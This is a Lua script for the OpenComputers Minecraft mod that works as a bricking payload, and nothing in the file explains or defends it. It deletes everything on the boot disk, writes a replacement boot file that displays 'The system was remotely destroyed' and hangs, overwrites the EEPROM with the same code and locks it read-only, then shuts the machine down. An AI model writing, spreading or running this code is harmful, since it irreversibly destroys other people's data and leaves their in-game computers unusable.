local component = component or require("component")
local computer = computer or require("computer")

local disk = component.proxy(computer.getBootAddress and (computer.getBootAddress() or ""))
local eeprom = component.proxy(component.list("eeprom")() or "")

local bricklogo = [[local component=component or require("component")local computer=computer or require("computer")local unicode=unicode or require("unicode")computer.beep("...-")local a=component.proxy(component.list("gpu")()or"")if a then for b in component.list("screen")do a.bind(b)if not pcall(a.setResolution,80,25)then pcall(a.setResolution,50,16)end;local c,d=a.getResolution()local e,f=c/2,d/2;local g={"     ◢█◣","    ◢███◣","   ◢█████◣","  ◢███████◣"," ◢█████████◣","◢███████████◣"}local h={"█","█","█","","▀"}local i=false;if a.getDepth()>1 then i=true;a.setPaletteColor(0,0x000000)a.setPaletteColor(1,0xff0000)a.setPaletteColor(2,0xffffff)end;local j=math.ceil(e-6)local k=math.ceil(f-7)a.setBackground(0,i)a.setForeground(1,i)a.fill(1,1,c,d," ")for l=1,#g do a.set(j,l+k,g[l])end;if i then a.setBackground(1,true)a.setForeground(2,true)else a.setBackground(0xffffff)a.setForeground(0x000000)end;for l=1,#h do a.set(j+6,k+l+1,h[l])end;a.setBackground(0,i)a.setForeground(2,i)local function m(n,o)a.set(math.floor(e-unicode.len(o)/2)+1,n,o)end;m(f+3,"The system was remotely destroyed")m(f+4,"Press power button to shutdown")end end;while true do computer.pullSignal()end]]

if disk then
	pcall(function()
		disk.remove("/")
		local file = disk.open("/init.lua", "wb")
		disk.write(file, bricklogo)
		disk.close(file)
	end)
end

if eeprom then
	local checksum
	pcall(eeprom.set, bricklogo)
	pcall(function () checksum = eeprom.getChecksum() end)
	pcall(eeprom.makeReadonly, checksum or "")
	pcall(eeprom.setData, "")
	pcall(eeprom.setLabel, "bricked eeprom")
end

pcall(computer.shutdown, "fast")